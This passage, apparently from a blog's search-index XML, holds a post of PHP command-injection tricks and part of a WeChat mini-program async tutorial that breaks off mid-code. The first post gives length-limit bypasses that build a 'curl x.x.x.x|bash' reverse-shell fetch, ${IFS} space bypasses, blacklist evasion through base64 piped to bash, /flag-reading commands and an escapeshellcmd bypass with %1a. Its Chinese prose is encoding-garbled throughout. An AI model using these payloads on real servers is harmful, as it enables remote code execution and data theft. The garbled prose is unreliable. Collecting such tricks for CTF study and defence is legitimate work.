            <tag> Owasp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpå‘½ä»¤æ‰§è¡Œå°æŠ€å·§</title>
      <link href="posts/45c7e77/"/>
      <url>posts/45c7e77/</url>
      
        <content type="html"><![CDATA[    <div id="aplayer-mcttOWYH" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="115162" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><span id="more"></span><h2 id="çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶"><a href="#çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶" class="headerlink" title="çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶"></a><strong>çªç ´å‘½ä»¤é•¿åº¦é™åˆ¶</strong></h2><p>é™åˆ¶æ¡ä»¶ï¼šé•¿åº¦<strong>&lt;=4</strong></p><p>é™åˆ¶ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hack!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a><strong>å‘½ä»¤æ‰§è¡Œ</strong></h3><p>å…ˆçœ‹æ•ˆæœå›¾ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814204553709.png" alt loading="lazy"></p><p><strong>åŸç†</strong></p><ol><li><code>&gt;</code>åé¢è·Ÿçš„æ–‡ä»¶åï¼Œå¯ä»¥ç”Ÿæˆä¸€ä¸ªä»¥è¿™ä¸ªå­—ç¬¦ä¸²å‘½åçš„æ–‡ä»¶</li><li><code>*</code>å¯ä»¥å°†æ–‡ä»¶åï¼ˆæŒ‰é¦–å­—æ¯æ’åºï¼‰åˆ—å‡ºæ¥å½“ä¸€è¡Œå‘½ä»¤æ‰§è¡Œ</li><li><code>*v</code>åŒ¹é…å½“å‰ç›®å½•ä¸‹ä»¥<code>v</code>ç»“å°¾çš„çš„æ–‡ä»¶åï¼Œ<code>*v</code>=<code>rev v</code>ï¼Œè¾“å‡º<code>v</code>æ–‡ä»¶å†…å®¹é‡Œé¢å†…å®¹çš„ååºç»“æœï¼Œ<code>&gt;cat|*t</code>åŒç†</li><li><code>dir a b&gt;c</code>åªä¼šå°†<code>a b</code>å†™åˆ°æ–‡ä»¶<code>c</code>ä¸­</li></ol><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a><strong>åå¼¹shell</strong></h3><p>å…ˆçœ‹æ•ˆæœå›¾ï¼š</p><p>è·å–<code>ls -th &gt;g</code>å‘½ä»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814220444746.png" alt loading="lazy"></p><p>è·å–<code>curl x.x.x.x|bash</code>å‘½ä»¤</p><p><code>&gt;cu\\</code>è¿™é‡Œçœ‹ç€æ˜¯5ä¸ªå­—ç¬¦ï¼Œè¶…è¿‡äº†4ä¸ªçš„é™åˆ¶ï¼Œå®é™…ä¸Šæ˜¯å› ä¸º shellç¯å¢ƒéœ€è¦è¾“å…¥<code>\\</code>äº§ç”Ÿ<code>\</code>ï¼Œä½†æ˜¯<code>php</code> ä»£ç <code>exec</code>æ—¶ï¼Œåªéœ€è¦è¾“å…¥<code>\</code>å³å¯äº§ç”Ÿ<code>\</code>ï¼Œæ¯”å¦‚ <code>exec(&quot;&gt;cu\&quot;)</code>å³å¯ã€‚æ‰€ä»¥è¿™é‡Œå®é™…ä¸Šæ˜¯ä¸è¶…è¿‡4ä¸ªå­—ç¬¦çš„ï¼Œä¸ºäº†æ¼”ç¤ºç›´è§‚ï¼Œåœ¨<code>shell</code>ä¸­ç›´æ¥æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814223956562.png" alt loading="lazy"></p><p>æ‰§è¡Œç»“æœï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814221328388.png" alt loading="lazy"></p><p><strong>åŸç†</strong></p><ol><li><code>ls -t</code>æŒ‰æ—¶é—´é¡ºåºæ’åˆ—æ–‡ä»¶ï¼Œ<code>ls -th</code>ä¸å½±å“å‘½ä»¤æ‰§è¡Œï¼Œä¸ºäº†è®©å€’åºçš„æ—¶å€™<code>ht-</code>åœ¨<code>sl</code>å‰é¢</li><li><code>\</code>  <code>linux</code>ä¸‹è¡Œæœ«åŠ ä¸Š<code>\</code>ä¼šå°†è¯¥è¡Œæœ«å°¾ä¸ä¸‹ä¸€è¡Œè¡Œé¦–è¿æ¥èµ·æ¥ï¼Œç®€å•æ¥è¯´åº”è¯¥æ˜¯åˆ æ‰äº†æ¢è¡Œç¬¦</li></ol><p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæ–‡ä»¶åä¸­ä¸èƒ½åŒ…å«<code>/</code>è¿™ä¸ªç¬¦å·çš„ï¼Œæ‰€ä»¥éœ€è¦å°†åå¼¹shellçš„æœåŠ¡å™¨æ ¹ç›®å½•ä¸‹é»˜è®¤ç½‘é¡µè®¾ç½®æˆcurlä¸‹åå¼¹shellçš„å‘½ä»¤çš„ç½‘é¡µ</p><p>ä¾‹å¦‚æˆ‘ubuntuæœåŠ¡å™¨çš„Apacheé»˜è®¤ç½‘é¡µè®¾ç½®åœ¨<code>/etc/apache2/mods-available/dir.conf</code>ä¸­ï¼Œç¼–è¾‘å¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814225408259.png" alt loading="lazy"></p><p>1.txtä¸­ä¸ºåå¼¹shellçš„å‘½ä»¤ï¼Œè¿™æ ·å³å¯æˆåŠŸæ‰§è¡Œ</p><p>æˆ–è€…ä½ æ”¹index.htmlçš„å†…å®¹ä¹Ÿè¡Œ</p><h2 id="ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡ç©ºæ ¼"></a><strong>ç»•è¿‡ç©ºæ ¼</strong></h2><ul><li>${PS2} å¯¹åº”å­—ç¬¦ â€˜&gt;â€™</li><li>${PS4} å¯¹åº”å­—ç¬¦ â€˜+â€™</li><li>${IFS} å¯¹åº” å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦</li><li>${9} å¯¹åº” ç©ºå­—ç¬¦ä¸²</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token variable">$9</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>phpä¸‹å¯ä»¥cat%09/flag<span class="token operator">&lt;></span>linux@Extrader:/var/www/html$ cat<span class="token operator">&lt;</span>/flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a><strong>é»‘åå•ç»•è¿‡</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">æ‹¼æ¥linux@Extrader:/var/www/html$ <span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>/flag<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">$c</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>base64ç¼–ç linux@Extrader:/var/www/html$ <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token variable">`</span></span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>å•å¼•å·ã€åŒå¼•å·linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /flagflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">""</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ c<span class="token string">""</span>at /fl<span class="token string">''</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>åæ–œçº¿ <span class="token punctuation">\</span>linux@Extrader:/var/www/html$ ca<span class="token punctuation">\</span>t /fl<span class="token punctuation">\</span>agflag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a><strong>æ–‡ä»¶è¯»å–</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flag   <span class="token comment"># è¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">rev</span> /flag   <span class="token comment"># å°†æ–‡ä»¶å†…å®¹ä»¥å­—ç¬¦ä¸ºå•ä½ååºè¾“å‡º</span><span class="token punctuation">&#125;</span>e32de3e34-g45t4d2-45gt532-34f32e3<span class="token punctuation">&#123;</span>galflinux@Extrader:/var/www/html$ <span class="token function">more</span> /flag  <span class="token comment"># æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œæ¯æ¬¡æ˜¾ç¤ºä¸€å±</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">tail</span> /flag  <span class="token comment"># åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„æœ«å°¾è‹¥å¹²è¡Œ</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">less</span> /flag  <span class="token comment"># åˆ†å±ä¸Šä¸‹ç¿»é¡µæµè§ˆæ–‡ä»¶å†…å®¹</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">head</span> /flag  <span class="token comment"># åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å¼€å¤´è‹¥å¹²è¡Œ</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">tac</span> /flag   <span class="token comment"># å°†æ–‡ä»¶ä»¥è¡Œä¸ºå•ä½çš„ååºè¾“å‡º</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">sort</span> /flag  <span class="token comment"># å°†æ–‡ä»¶è¿›è¡Œæ’åºå¹¶è¾“å‡º</span>flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">nl</span> /flag    <span class="token comment"># åœ¨Linuxç³»ç»Ÿä¸­è®¡ç®—æ–‡ä»¶å†…å®¹è¡Œå·</span>     <span class="token number">1</span>  flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ hexdump /flag  <span class="token comment">#æ˜¾ç¤ºæ–‡ä»¶åå…­è¿›åˆ¶æ ¼å¼</span>0000000 6c66 <span class="token number">6761</span> 337b <span class="token number">3265</span> <span class="token number">6633</span> <span class="token number">3334</span> 322d <span class="token number">3533</span>0000010 <span class="token number">6774</span> <span class="token number">3435</span> 322d <span class="token number">3464</span> <span class="token number">3574</span> <span class="token number">6734</span> 342d <span class="token number">6533</span>0000020 <span class="token number">6533</span> <span class="token number">3264</span> <span class="token number">6533</span> 0a7d0000028linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fl*flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>linux@Extrader:/var/www/html$ <span class="token function">cat</span> /fla?flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre><h2 id="ç»•è¿‡escapeshellcmd"><a href="#ç»•è¿‡escapeshellcmd" class="headerlink" title="ç»•è¿‡escapeshellcmd"></a><strong>ç»•è¿‡escapeshellcmd</strong></h2><p>æµ‹è¯•ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dir '</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$escaped_command</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">,</span><span class="token variable">$escaped_command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'out.bat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æ‰§è¡Œ<code>.bat</code>æ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ©ç”¨<code>%1a</code>ï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤ã€‚</p><p>payload</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">dir</span><span class="token operator">=</span>. %1a <span class="token function">whoami</span></code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><strong>å‚è€ƒ</strong></h2><ul><li><a href="https://www.leavesongs.com/content/files/slides/%E6%9D%A5%E8%87%AA%E5%B0%8F%E5%AF%86%E5%9C%88%E9%87%8C%E7%9A%84%E9%82%A3%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7.pdf">æ¥è‡ªå°å¯†åœˆé‡Œçš„é‚£äº›å¥‡æŠ€æ·«å·§</a></li><li><a href="https://www.mi1k7ea.com/2019/06/30/å‘½ä»¤æ³¨å…¥BypassæŠ€å·§å°ç»“/">å‘½ä»¤æ³¨å…¥BypassæŠ€å·§å°ç»“</a></li><li><a href="https://www.freebuf.com/articles/web/154453.html">æŒ–æ´ç»éªŒ|å‘½ä»¤æ³¨å…¥çªç ´é•¿åº¦é™åˆ¶</a></li><li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾®ä¿¡å°ç¨‹åºæœ‰å…³å¼‚æ­¥é—®é¢˜çš„ä¸€äº›æ“ä½œ</title>
      <link href="posts/80b70afe/"/>
      <url>posts/80b70afe/</url>
      
        <content type="html"><![CDATA[<p>æ–¹æ³•ä¸å”¯ä¸€ï¼Œåç»­æœ‰æ–°æ–¹æ³•å†è¡¥ä¸Š~</p><span id="more"></span><h3 id="Promise-å¯¹è±¡"><a href="#Promise-å¯¹è±¡" class="headerlink" title="Promise å¯¹è±¡"></a>Promise å¯¹è±¡</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* å¼‚æ­¥æ“ä½œæˆåŠŸ */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// success</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// failure</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å…³äº<code>promise</code>  å…·ä½“å¯å‚è€ƒé˜®è€å¸ˆçš„<a href="https://es6.ruanyifeng.com/#docs/promise">Promise å¯¹è±¡</a></p><p>æˆ–è€…ç›´æ¥</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°"><a href="#åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°" class="headerlink" title="åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°"></a>åŒæ­¥åŒ–å¼‚æ­¥å‡½æ•°</h3><p>app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>  getUserInfo<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>getUserInfo<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>index.jsä½¿ç”¨</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>Object.assign()</code> æ–¹æ³•ç”¨äºå°†æ‰€æœ‰å¯æšä¸¾å±æ€§çš„å€¼ä»ä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡å¤åˆ¶åˆ°ç›®æ ‡å¯¹è±¡ã€‚å®ƒå°†è¿”å›ç›®æ ‡å¯¹è±¡ã€‚</p><h3 id="wx-requestè¯·æ±‚å°è£…"><a href="#wx-requestè¯·æ±‚å°è£…" class="headerlink" title="wx.requestè¯·æ±‚å°è£…"></a>wx.requestè¯·æ±‚å°è£…</h3><h4 id="å¼‚æ­¥"><a href="#å¼‚æ­¥" class="headerlink" title="å¼‚æ­¥"></a>å¼‚æ­¥</h4><p><code>api/index.js</code>å°è£…</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">postdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        